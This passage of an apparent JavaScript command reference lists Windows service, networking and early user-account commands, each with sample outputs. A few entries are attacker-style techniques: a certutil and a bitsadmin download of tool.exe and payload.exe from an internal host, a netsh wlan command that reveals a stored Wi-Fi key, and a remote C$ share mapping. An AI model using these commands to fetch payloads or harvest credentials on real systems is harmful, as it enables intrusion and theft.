      { usage: 'sc qc Spooler', output: '[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS (interactive)\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\System32\\spoolsv.exe\n        LOAD_ORDER_GROUP   : SpoolerGroup\n        TAG                : 0\n        DISPLAY_NAME       : Print Spooler\n        DEPENDENCIES       : RPCSS\\0http\n        SERVICE_START_NAME : LocalSystem' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc start',
    desc: 'Start a Windows service',
    examples: [
      { usage: 'sc start Spooler', output: 'SERVICE_NAME: Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS (interactive)\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x7d0\n        PID                : 2840\n        FLAGS              :' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc stop',
    desc: 'Stop a running Windows service',
    examples: [
      { usage: 'sc stop Spooler', output: 'SERVICE_NAME: Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS (interactive)\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x1\n        WAIT_HINT          : 0x4e20\n        PID                : 2840\n        FLAGS              :' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc config',
    desc: 'Modify the configuration of a service',
    examples: [
      { usage: 'sc config Spooler start= disabled', output: '[SC] ChangeServiceConfig SUCCESS' },
      { usage: 'sc config MyService binPath= "C:\\tools\\svc.exe" start= auto', output: '[SC] ChangeServiceConfig SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc create',
    desc: 'Create a new Windows service entry',
    examples: [
      { usage: 'sc create MyService binPath= "C:\\tools\\myservice.exe" DisplayName= "My Custom Service" start= auto', output: '[SC] CreateService SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc delete',
    desc: 'Delete a Windows service from the registry',
    examples: [
      { usage: 'sc delete MyService', output: '[SC] DeleteService SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc enumdepend',
    desc: 'List services that depend on a given service',
    examples: [
      { usage: 'sc enumdepend RpcSs', output: 'Enum: entriesRead=15\n\nSERVICE_NAME: WinDefend\nDISPLAY_NAME: Microsoft Defender Antivirus Service\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n\nSERVICE_NAME: Spooler\nDISPLAY_NAME: Print Spooler\n        TYPE               : 110  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc sdshow',
    desc: 'Display the security descriptor of a service in SDDL format',
    examples: [
      { usage: 'sc sdshow WinDefend', output: 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc sdset',
    desc: 'Set the security descriptor of a service using SDDL notation',
    examples: [
      { usage: 'sc sdset MyService D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)', output: '[SC] SetServiceObjectSecurity SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc description',
    desc: 'Set the description of a service',
    examples: [
      { usage: 'sc description MyService "Custom monitoring service for security events"', output: '[SC] ChangeServiceConfig2 SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc failure',
    desc: 'Configure service failure recovery actions',
    examples: [
      { usage: 'sc failure MyService reset= 86400 actions= restart/60000/restart/60000/run/60000', output: '[SC] ChangeServiceConfig2 SUCCESS' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc queryex',
    desc: 'Query extended status of a service including PID',
    examples: [
      { usage: 'sc queryex WinDefend', output: 'SERVICE_NAME: WinDefend\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n        PID                : 1804\n        FLAGS              :' }
    ],
    category: 'services'
  },
  {
    cmd: 'wmic service get Name,StartMode,State,PathName',
    desc: 'List all services with their binary paths and startup modes via WMI',
    examples: [
      { usage: 'wmic service get Name,StartMode,State,PathName | findstr /i "Running"', output: 'WinDefend    "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.23110.3-0\\MsMpEng.exe"    Auto       Running\nSpooler      C:\\Windows\\System32\\spoolsv.exe                                                     Auto       Running\nW32Time      C:\\Windows\\system32\\svchost.exe -k LocalService                                     Manual     Running' }
    ],
    category: 'services'
  },
  {
    cmd: 'wmic service where "startmode=\'Auto\' and state!=\'Running\'" get Name,StartMode,State',
    desc: 'Find auto-start services that are not currently running',
    examples: [
      { usage: 'wmic service where "startmode=\'Auto\' and state!=\'Running\'" get Name,StartMode,State', output: 'Name                  StartMode  State\nSQLBROWSER            Auto       Stopped\nwuauserv              Auto       Stopped\nRemoteRegistry        Auto       Stopped' }
    ],
    category: 'services'
  },
  {
    cmd: 'Get-Service',
    desc: 'PowerShell cmdlet to list and filter Windows services',
    examples: [
      { usage: 'Get-Service | Where-Object { $_.Status -eq "Running" } | Sort-Object DisplayName', output: 'Status   Name               DisplayName\n------   ----               -----------\nRunning  AppXSvc            AppX Deployment Service (AppXSVC)\nRunning  BFE                Base Filtering Engine\nRunning  CryptSvc           Cryptographic Services\nRunning  Dhcp               DHCP Client\nRunning  Dnscache           DNS Client\nRunning  EventLog           Windows Event Log\nRunning  WinDefend          Microsoft Defender Antivirus Service' },
      { usage: 'Get-Service -Name WinDefend | Format-List *', output: 'Name                : WinDefend\nDisplayName         : Microsoft Defender Antivirus Service\nStatus              : Running\nDependentServices   : {}\nServicesDependedOn  : {RpcSs}\nCanPauseAndContinue : False\nCanShutdown         : False\nCanStop             : False\nServiceType         : Win32OwnProcess\nStartType           : Automatic' }
    ],
    category: 'services'
  },
  {
    cmd: 'Get-WmiObject Win32_Service',
    desc: 'Query detailed service information via WMI in PowerShell',
    examples: [
      { usage: 'Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike "*svchost*" -and $_.State -eq "Running" } | Select-Object Name,PathName,StartName', output: 'Name         PathName                                                           StartName\n----         --------                                                           ---------\nMsMpEng      "C:\\ProgramData\\...\\MsMpEng.exe"                                    LocalSystem\nSpooler      C:\\Windows\\System32\\spoolsv.exe                                     LocalSystem\nsqlservr     "C:\\Program Files\\Microsoft SQL Server\\MSSQL16\\MSSQL\\Binn\\sqlservr.exe" -sMSSQLSERVER  NT Service\\MSSQLSERVER' }
    ],
    category: 'services'
  },
  {
    cmd: 'Get-CimInstance Win32_Service',
    desc: 'Modern PowerShell CIM query for Windows services',
    examples: [
      { usage: 'Get-CimInstance Win32_Service | Where-Object { $_.StartName -ne "LocalSystem" -and $_.StartName -ne $null } | Select-Object Name,StartName,State', output: 'Name           StartName                State\n----           ---------                -----\nMSSQLSERVER    NT Service\\MSSQLSERVER   Running\nSQLSERVERAGENT NT Service\\SQLSERVERAGENT Stopped\nApache2.4      .\\svcadmin               Running' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc querylock',
    desc: 'Query the lock status of the service control manager database',
    examples: [
      { usage: 'sc querylock', output: 'QueryServiceLockStatus SUCCESS\n\n        IsLocked           : FALSE\n        LockOwner          :\n        LockDuration (seconds) : 0' }
    ],
    category: 'services'
  },
  {
    cmd: 'sc privs',
    desc: 'Display the required privileges for a service',
    examples: [
      { usage: 'sc privs WinDefend', output: '[SC] QueryServiceConfig2 SUCCESS\n\nSERVICE_NAME: WinDefend\n        REQUIRED_PRIVILEGES  : SeImpersonatePrivilege\n                             : SeDebugPrivilege\n                             : SeTcbPrivilege\n                             : SeAssignPrimaryTokenPrivilege\n                             : SeLoadDriverPrivilege\n                             : SeBackupPrivilege\n                             : SeRestorePrivilege\n                             : SeShutdownPrivilege' }
    ],
    category: 'services'
  },
  {
    cmd: 'net start',
    desc: 'List all currently running services or start a service',
    examples: [
      { usage: 'net start', output: 'These Windows services are started:\n\n   Base Filtering Engine\n   COM+ Event System\n   Cryptographic Services\n   DHCP Client\n   DNS Client\n   Microsoft Defender Antivirus Service\n   Print Spooler\n   Windows Event Log\n   Windows Management Instrumentation' },
      { usage: 'net start Spooler', output: 'The Print Spooler service is starting.\nThe Print Spooler service was started successfully.' }
    ],
    category: 'services'
  },
  {
    cmd: 'net stop',
    desc: 'Stop a running Windows service',
    examples: [
      { usage: 'net stop Spooler', output: 'The Print Spooler service is stopping.\nThe Print Spooler service was stopped successfully.' }
    ],
    category: 'services'
  },

  // ============================================================
  // NETWORKING (32 commands)
  // ============================================================
  {
    cmd: 'ipconfig',
    desc: 'Display TCP/IP network configuration for all adapters',
    examples: [
      { usage: 'ipconfig /all', output: 'Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : WORKSTATION01\n   Primary Dns Suffix  . . . . . . . : corp.local\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : corp.local\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit\n   Physical Address. . . . . . . . . : 00-0C-29-A1-B2-C3\n   DHCP Enabled. . . . . . . . . . . : Yes\n   IPv4 Address. . . . . . . . . . . : 192.168.1.105(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.1.1\n   DNS Servers . . . . . . . . . . . : 192.168.1.10\n                                        192.168.1.11' },
      { usage: 'ipconfig /displaydns | findstr "Record"', output: '    Record Name . . . . . : www.google.com\n    Record Name . . . . . : dc01.corp.local\n    Record Name . . . . . : intranet.corp.local\n    Record Name . . . . . : fileserver.corp.local' },
      { usage: 'ipconfig /flushdns', output: 'Windows IP Configuration\n\nSuccessfully flushed the DNS Resolver Cache.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netstat',
    desc: 'Display active network connections, listening ports, and associated processes',
    examples: [
      { usage: 'netstat -ano', output: 'Active Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1024\n  TCP    192.168.1.105:49672    40.90.189.152:443      ESTABLISHED     3412\n  TCP    192.168.1.105:49715    13.107.42.14:443       ESTABLISHED     3412\n  UDP    0.0.0.0:53             *:*                                    1224\n  UDP    0.0.0.0:5353           *:*                                    1368' },
      { usage: 'netstat -anb', output: '  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING\n [httpd.exe]\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING\n [svchost.exe]\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING\n [svchost.exe]' },
      { usage: 'netstat -s', output: 'IPv4 Statistics\n\n  Packets Received                   = 1524896\n  Received Header Errors             = 0\n  Received Address Errors            = 125\n  Datagrams Forwarded                = 0\n  Packets Delivered                  = 1524771\n  Output Requests                    = 1456234\n\nTCP Statistics for IPv4\n\n  Active Opens                       = 12456\n  Passive Opens                      = 234\n  Failed Connection Attempts         = 89\n  Reset Connections                  = 567\n  Current Connections                = 42' }
    ],
    category: 'networking'
  },
  {
    cmd: 'nslookup',
    desc: 'Query DNS name servers for domain name or IP address resolution',
    examples: [
      { usage: 'nslookup dc01.corp.local', output: 'Server:  dns01.corp.local\nAddress:  192.168.1.10\n\nName:    dc01.corp.local\nAddress:  192.168.1.100' },
      { usage: 'nslookup -type=MX corp.local', output: 'Server:  dns01.corp.local\nAddress:  192.168.1.10\n\ncorp.local  MX preference = 10, mail exchanger = mail.corp.local\ncorp.local  MX preference = 20, mail exchanger = mail2.corp.local' },
      { usage: 'nslookup -type=any corp.local', output: 'Server:  dns01.corp.local\nAddress:  192.168.1.10\n\ncorp.local\n        primary name server = dc01.corp.local\n        responsible mail addr = admin.corp.local\n        serial  = 1234\n        refresh = 900 (15 mins)\n        retry   = 600 (10 mins)\n        expire  = 86400 (1 day)\n        default TTL = 3600 (1 hour)\ncorp.local      nameserver = dc01.corp.local\ncorp.local      nameserver = dc02.corp.local' }
    ],
    category: 'networking'
  },
  {
    cmd: 'ping',
    desc: 'Test network connectivity to a host using ICMP echo requests',
    examples: [
      { usage: 'ping -n 4 192.168.1.1', output: 'Pinging 192.168.1.1 with 32 bytes of data:\nReply from 192.168.1.1: bytes=32 time<1ms TTL=64\nReply from 192.168.1.1: bytes=32 time<1ms TTL=64\nReply from 192.168.1.1: bytes=32 time<1ms TTL=64\nReply from 192.168.1.1: bytes=32 time<1ms TTL=64\n\nPing statistics for 192.168.1.1:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms' }
    ],
    category: 'networking'
  },
  {
    cmd: 'tracert',
    desc: 'Trace the route to a remote host showing each network hop',
    examples: [
      { usage: 'tracert -d 8.8.8.8', output: 'Tracing route to 8.8.8.8 over a maximum of 30 hops\n\n  1    <1 ms    <1 ms    <1 ms  192.168.1.1\n  2     2 ms     1 ms     1 ms  10.0.0.1\n  3     5 ms     5 ms     4 ms  72.14.236.126\n  4     8 ms     7 ms     7 ms  108.170.248.33\n  5     8 ms     8 ms     7 ms  8.8.8.8\n\nTrace complete.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'pathping',
    desc: 'Combine ping and tracert to provide detailed latency and packet loss statistics per hop',
    examples: [
      { usage: 'pathping -n 8.8.8.8', output: 'Tracing route to 8.8.8.8 over a maximum of 30 hops\n  0  192.168.1.105\n  1  192.168.1.1\n  2  10.0.0.1\n  3  72.14.236.126\n  4  8.8.8.8\n\nComputing statistics for 100 seconds...\n            Source to Here   This Node/Link\nHop  RTT    Lost/Sent = Pct  Lost/Sent = Pct\n  0                                           \n  1    0ms     0/ 100 =  0%     0/ 100 =  0%\n  2    2ms     0/ 100 =  0%     0/ 100 =  0%\n  3    5ms     1/ 100 =  1%     1/ 100 =  1%\n  4    8ms     0/ 100 =  0%     0/ 100 =  0%' }
    ],
    category: 'networking'
  },
  {
    cmd: 'route print',
    desc: 'Display the IP routing table',
    examples: [
      { usage: 'route print', output: '===========================================================================\nInterface List\n  6...00 0c 29 a1 b2 c3 ......Intel(R) 82574L Gigabit Network Connection\n  1...........................Software Loopback Interface 1\n===========================================================================\n\nIPv4 Route Table\n===========================================================================\nActive Routes:\nNetwork Destination        Netmask          Gateway       Interface  Metric\n          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.105     25\n        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331\n      192.168.1.0    255.255.255.0         On-link     192.168.1.105    281\n      192.168.1.105  255.255.255.255       On-link     192.168.1.105    281\n      192.168.1.255  255.255.255.255       On-link     192.168.1.105    281\n===========================================================================\nPersistent Routes:\n  None' }
    ],
    category: 'networking'
  },
  {
    cmd: 'arp -a',
    desc: 'Display the ARP cache showing IP-to-MAC address mappings',
    examples: [
      { usage: 'arp -a', output: 'Interface: 192.168.1.105 --- 0x6\n  Internet Address      Physical Address      Type\n  192.168.1.1           00-1a-2b-3c-4d-5e     dynamic\n  192.168.1.10          00-0c-29-11-22-33     dynamic\n  192.168.1.100         00-0c-29-aa-bb-cc     dynamic\n  192.168.1.255         ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh advfirewall show allprofiles',
    desc: 'Display Windows Firewall configuration for all profiles',
    examples: [
      { usage: 'netsh advfirewall show allprofiles', output: 'Domain Profile Settings:\n----------------------------------------------------------------------\nState                                 ON\nFirewall Policy                       BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (GPO-store only)\nLocalConSecRules                      N/A (GPO-store only)\nInboundUserNotification               Enable\n\nPrivate Profile Settings:\n----------------------------------------------------------------------\nState                                 ON\nFirewall Policy                       BlockInbound,AllowOutbound\n\nPublic Profile Settings:\n----------------------------------------------------------------------\nState                                 ON\nFirewall Policy                       BlockInbound,AllowOutbound' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh advfirewall firewall show rule name=all',
    desc: 'List all Windows Firewall rules',
    examples: [
      { usage: 'netsh advfirewall firewall show rule name=all dir=in | findstr /i "Rule Name"', output: 'Rule Name:                            Core Networking - Dynamic Host Configuration Protocol (DHCP-In)\nRule Name:                            Core Networking - DNS (UDP-In)\nRule Name:                            File and Printer Sharing (Echo Request - ICMPv4-In)\nRule Name:                            Remote Desktop - User Mode (TCP-In)\nRule Name:                            Windows Remote Management (HTTP-In)' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh wlan show profiles',
    desc: 'Display saved wireless network profiles',
    examples: [
      { usage: 'netsh wlan show profiles', output: 'Profiles on interface Wi-Fi:\n\nGroup policy profiles (read only)\n---------------------------------\n    <None>\n\nUser profiles\n-------------\n    All User Profile     : CorpWiFi\n    All User Profile     : GuestNetwork\n    All User Profile     : HomeNetwork' },
      { usage: 'netsh wlan show profile name="CorpWiFi" key=clear', output: 'Profile CorpWiFi on interface Wi-Fi:\n=======================================================================\n\nConnectivity settings\n---------------------\n    SSID name           : "CorpWiFi"\n    Network type        : Infrastructure\n    Radio type          : [ Any Radio Type ]\n    Vendor extension    : Not present\n\nSecurity settings\n-----------------\n    Authentication      : WPA2-Enterprise\n    Cipher              : CCMP\n    Key Content         : Corp@WiFi2024!' }
    ],
    category: 'networking'
  },
  {
    cmd: 'nbtstat',
    desc: 'Display NetBIOS over TCP/IP statistics and name tables',
    examples: [
      { usage: 'nbtstat -A 192.168.1.100', output: 'NetBIOS Remote Machine Name Table\n\n       Name               Type         Status\n    ---------------------------------------------\n    DC01           <00>  UNIQUE      Registered\n    CORP           <00>  GROUP       Registered\n    DC01           <20>  UNIQUE      Registered\n    CORP           <1E>  GROUP       Registered\n    CORP           <1C>  GROUP       Registered\n    CORP           <1B>  UNIQUE      Registered\n\n    MAC Address = 00-0C-29-AA-BB-CC' },
      { usage: 'nbtstat -n', output: 'Local Area Connection:\nNode IpAddress: [192.168.1.105] Scope Id: []\n\n               NetBIOS Local Name Table\n\n       Name               Type         Status\n    ---------------------------------------------\n    WORKSTATION01  <00>  UNIQUE      Registered\n    CORP           <00>  GROUP       Registered\n    WORKSTATION01  <20>  UNIQUE      Registered' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Test-NetConnection',
    desc: 'PowerShell network diagnostic tool for testing TCP connectivity and tracing routes',
    examples: [
      { usage: 'Test-NetConnection -ComputerName dc01.corp.local -Port 389', output: 'ComputerName     : dc01.corp.local\nRemoteAddress    : 192.168.1.100\nRemotePort       : 389\nInterfaceAlias   : Ethernet0\nSourceAddress    : 192.168.1.105\nTcpTestSucceeded : True' },
      { usage: 'Test-NetConnection -ComputerName 192.168.1.100 -Port 3389 -InformationLevel Detailed', output: 'ComputerName            : 192.168.1.100\nRemoteAddress           : 192.168.1.100\nRemotePort              : 3389\nNameResolutionResults   : 192.168.1.100\nMatchingIPsecRules      :\nNetworkIsolationContext : Internet\nIsAdmin                 : True\nInterfaceAlias          : Ethernet0\nSourceAddress           : 192.168.1.105\nNetRoute (NextHop)      : 0.0.0.0\nTcpTestSucceeded        : True' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Resolve-DnsName',
    desc: 'PowerShell DNS resolution cmdlet supporting all record types',
    examples: [
      { usage: 'Resolve-DnsName -Name corp.local -Type ALL', output: 'Name        Type TTL  Section    IPAddress\n----        ---- ---  -------    ---------\ncorp.local  A    3600 Answer     192.168.1.100\ncorp.local  A    3600 Answer     192.168.1.101\ncorp.local  NS   3600 Authority  dc01.corp.local\ncorp.local  NS   3600 Authority  dc02.corp.local\ncorp.local  SOA  3600 Authority  [System.Net.DnsClient.DnsRecord]' },
      { usage: 'Resolve-DnsName -Name corp.local -Type SRV -DnsOnly', output: 'Name                                     Type TTL  Section    Target               Port\n----                                     ---- ---  -------    ------               ----\n_ldap._tcp.dc._msdcs.corp.local          SRV  600  Answer     dc01.corp.local      389\n_ldap._tcp.dc._msdcs.corp.local          SRV  600  Answer     dc02.corp.local      389\n_kerberos._tcp.dc._msdcs.corp.local      SRV  600  Answer     dc01.corp.local      88' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-NetAdapter',
    desc: 'PowerShell cmdlet to list network adapters and their status',
    examples: [
      { usage: 'Get-NetAdapter', output: 'Name         InterfaceDescription             ifIndex Status       MacAddress         LinkSpeed\n----         --------------------             ------- ------       ----------         ---------\nEthernet0    Intel(R) 82574L Gigabit Network        6 Up           00-0C-29-A1-B2-C3  1 Gbps\nWi-Fi        Intel(R) Wireless-AC 9260             12 Disconnected 00-1A-2B-3C-4D-5E  0 bps' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-NetIPAddress',
    desc: 'Display IP addresses assigned to network interfaces',
    examples: [
      { usage: 'Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias,IPAddress,PrefixLength', output: 'InterfaceAlias  IPAddress       PrefixLength\n--------------  ---------       ------------\nEthernet0       192.168.1.105   24\nLoopback        127.0.0.1       8' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-NetTCPConnection',
    desc: 'PowerShell cmdlet to display TCP connections similar to netstat',
    examples: [
      { usage: 'Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess', output: 'LocalAddress   LocalPort RemoteAddress   RemotePort OwningProcess\n------------   --------- -------------   ---------- -------------\n192.168.1.105  49672     40.90.189.152   443        3412\n192.168.1.105  49715     13.107.42.14    443        3412\n192.168.1.105  49810     192.168.1.100   445        4\n192.168.1.105  50123     192.168.1.100   389        660' },
      { usage: 'Get-NetTCPConnection -State Listen | Sort-Object LocalPort | Select-Object -First 10 LocalAddress,LocalPort,OwningProcess', output: 'LocalAddress  LocalPort OwningProcess\n------------  --------- -------------\n0.0.0.0       80        4\n0.0.0.0       135       876\n0.0.0.0       445       4\n0.0.0.0       3389      1024\n0.0.0.0       5985      4\n0.0.0.0       5986      4\n::            80        4\n::            135       876\n::            445       4\n::            3389      1024' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-NetFirewallRule',
    desc: 'PowerShell cmdlet to query Windows Firewall rules',
    examples: [
      { usage: 'Get-NetFirewallRule -Enabled True -Direction Inbound | Select-Object DisplayName,Action,Profile | Format-Table', output: 'DisplayName                                          Action Profile\n-----------                                          ------ -------\nCore Networking - DHCP (DHCP-In)                      Allow  Any\nCore Networking - DNS (UDP-In)                        Allow  Any\nFile and Printer Sharing (Echo Request - ICMPv4-In)   Allow  Domain\nRemote Desktop - User Mode (TCP-In)                   Allow  Any\nWindows Remote Management (HTTP-In)                   Allow  Domain, Private' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh interface ipv4 show neighbors',
    desc: 'Display the ARP neighbor cache using netsh',
    examples: [
      { usage: 'netsh interface ipv4 show neighbors', output: 'Interface 6: Ethernet0\n\nInternet Address      Physical Address      Type\n--------------------  --------------------- -----------\n192.168.1.1           00-1a-2b-3c-4d-5e     Reachable (Router)\n192.168.1.10          00-0c-29-11-22-33     Reachable\n192.168.1.100         00-0c-29-aa-bb-cc     Reachable\n224.0.0.22            01-00-5e-00-00-16     Permanent' }
    ],
    category: 'networking'
  },
  {
    cmd: 'certutil -urlcache -split -f',
    desc: 'Download a file using certutil (commonly used for file transfer in restricted environments)',
    examples: [
      { usage: 'certutil -urlcache -split -f http://192.168.1.200/tool.exe C:\\temp\\tool.exe', output: '****  Online  ****\n  0000  ...                                         \n  d4f0\nCertUtil: -URLCache command completed successfully.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'bitsadmin /transfer',
    desc: 'Download files using Background Intelligent Transfer Service',
    examples: [
      { usage: 'bitsadmin /transfer mydownload /priority high http://192.168.1.200/payload.exe C:\\temp\\payload.exe', output: 'DISPLAY: mydownload\nTYPE: DOWNLOAD\nSTATE: TRANSFERRED\nPRIORITY: HIGH\nFILES:              1 / 1\nBYTES:         54512 / 54512 (100%)' }
    ],
    category: 'networking'
  },
  {
    cmd: 'curl',
    desc: 'Transfer data from or to a server using various protocols (available in Windows 10+)',
    examples: [
      { usage: 'curl.exe -s http://ifconfig.me', output: '203.0.113.45' },
      { usage: 'curl.exe -s -o C:\\temp\\file.txt http://192.168.1.200/data.txt', output: '' }
    ],
    category: 'networking'
  },
  {
    cmd: 'net use',
    desc: 'Map or manage network drive connections and shared resources',
    examples: [
      { usage: 'net use', output: 'New connections will be remembered.\n\nStatus       Local     Remote                    Network\n-------------------------------------------------------------------------------\nOK           Z:        \\\\fileserver\\share         Microsoft Windows Network\nOK                     \\\\dc01\\SYSVOL             Microsoft Windows Network\nThe command completed successfully.' },
      { usage: 'net use \\\\192.168.1.200\\C$ /user:CORP\\admin', output: 'The command completed successfully.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'net view',
    desc: 'Display a list of computers or shared resources in the network',
    examples: [
      { usage: 'net view \\\\dc01', output: 'Shared resources at \\\\dc01\n\nShare name  Type  Used as  Comment\n-------------------------------------------------------------------------------\nNETLOGON    Disk           Logon server share\nSYSVOL      Disk           Logon server share\nSharedDocs  Disk           Company documents\nThe command completed successfully.' },
      { usage: 'net view /domain:CORP', output: 'Server Name            Remark\n-------------------------------------------------------------------------------\n\\\\DC01                  Domain Controller\n\\\\DC02                  Domain Controller\n\\\\FILESERVER            File Server\n\\\\SQLSERVER             SQL Server\nThe command completed successfully.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh interface portproxy add v4tov4',
    desc: 'Set up port forwarding on the local machine',
    examples: [
      { usage: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.200', output: '' },
      { usage: 'netsh interface portproxy show all', output: 'Listen on ipv4:             Connect to ipv4:\n\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n0.0.0.0         8080        192.168.1.200   80' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-DnsClientCache',
    desc: 'PowerShell cmdlet to display the local DNS resolver cache',
    examples: [
      { usage: 'Get-DnsClientCache | Select-Object Entry,RecordName,Data', output: 'Entry                RecordName           Data\n-----                ----------           ----\ndc01.corp.local      dc01.corp.local      192.168.1.100\nwww.google.com       www.google.com       142.250.80.4\nintranet.corp.local  intranet.corp.local  192.168.1.50' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-NetRoute',
    desc: 'PowerShell cmdlet to display the IP routing table',
    examples: [
      { usage: 'Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.NextHop -ne "0.0.0.0" } | Select-Object DestinationPrefix,NextHop,InterfaceAlias', output: 'DestinationPrefix  NextHop       InterfaceAlias\n-----------------  -------       --------------\n0.0.0.0/0          192.168.1.1   Ethernet0\n10.10.0.0/16       192.168.1.254 Ethernet0' }
    ],
    category: 'networking'
  },
  {
    cmd: 'netsh advfirewall firewall add rule',
    desc: 'Add a new Windows Firewall rule via netsh',
    examples: [
      { usage: 'netsh advfirewall firewall add rule name="Block Telnet" dir=in action=block protocol=tcp localport=23', output: 'Ok.' },
      { usage: 'netsh advfirewall firewall add rule name="Allow WinRM" dir=in action=allow protocol=tcp localport=5985', output: 'Ok.' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-SmbShare',
    desc: 'PowerShell cmdlet to list SMB shares on the local machine',
    examples: [
      { usage: 'Get-SmbShare', output: 'Name    ScopeName  Path                   Description\n----    ---------  ----                   -----------\nADMIN$  *          C:\\Windows             Remote Admin\nC$      *          C:\\                    Default share\nIPC$    *                                 Remote IPC\nShared  *          C:\\Shared              Company shared folder' }
    ],
    category: 'networking'
  },
  {
    cmd: 'Get-SmbConnection',
    desc: 'PowerShell cmdlet to show active SMB client connections',
    examples: [
      { usage: 'Get-SmbConnection', output: 'ServerName    ShareName  UserName       Credential       Dialect  NumOpens\n----------    ---------  --------       ----------       -------  --------\ndc01          SYSVOL     CORP\\admin     CORP\\admin       3.1.1    2\nfileserver    SharedDocs CORP\\admin     CORP\\admin       3.0.2    5' }
    ],
    category: 'networking'
  },
  {
    cmd: 'net session',
    desc: 'Display active sessions connected to the local machine',
    examples: [
      { usage: 'net session', output: 'Computer               User name            Client Type       Opens    Idle time\n\n-------------------------------------------------------------------------------\n\\\\192.168.1.50          CORP\\jsmith           Windows 10        3        00:02:15\n\\\\192.168.1.55          CORP\\jdoe             Windows 10        1        00:15:30\nThe command completed successfully.' }
    ],
    category: 'networking'
  },

  // ============================================================
  // USERS (26 commands)
  // ============================================================
  {
    cmd: 'net user',
    desc: 'List user accounts or display detailed information about a specific user',
    examples: [
